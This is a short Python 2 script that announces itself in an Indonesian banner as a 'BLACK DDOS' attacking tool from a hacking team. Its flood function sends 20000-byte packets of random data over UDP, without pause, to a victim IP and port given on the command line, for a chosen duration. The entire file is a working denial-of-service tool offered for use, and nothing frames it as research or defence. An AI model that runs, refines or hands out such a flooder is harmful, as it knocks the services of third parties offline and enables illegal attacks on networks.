import time, socket, random, sys

def usage():
    print '\x1b[1;35m##################\x1b[1;32m{SELAMAT DATANG}\x1b[1;35m###################'
    print '\x1b[1;33m_____________________[\x1b[1;91mBCA-X666X\x1b[1;33m]______________________'
    print '\x1b[1;34m====================>\x1b[1;33m{BLACK DDOS}\x1b[1;34m<==================='
    print
    print '\x1b[1;36m AUTHOR CODING BY : MISTER BLACK CYBER \x1b[1;32m'
    print '\x1b[1;34m SCRIPT TYPE : ATTACKING \x1b[1;32m'
    print '\x1b[1;36m TEAM : BLACK CYBER ANONYMOUS TEAM 2K07     \x1b[1;32m                '
    print '\x1b[1;34m TEAM SUPPORT : MARIANAS WEB TEAM 2K05     \x1b[1;32m'
    print '\x1b[1;36m Version  :  8.8.8        \x1b[1;32m'
    print
    print '\x1b[1;36m##################\x1b[1;34m{BCA-X666X}\x1b[1;36m##################'
    print '\x1b[1;36m                   **********'
    print '\x1b[1;36m                  ************'
    print '\x1b[1;36m                ****************'


def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print '\x1b[1;36mMemulai \x1b[1;34m%s \x1b[1;36mMengirim Paket 50000 \x1b[1;34m%s \x1b[1;36mPada Port 80 \x1b[1;4m%s ' % (sent, victim, vport)


def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()
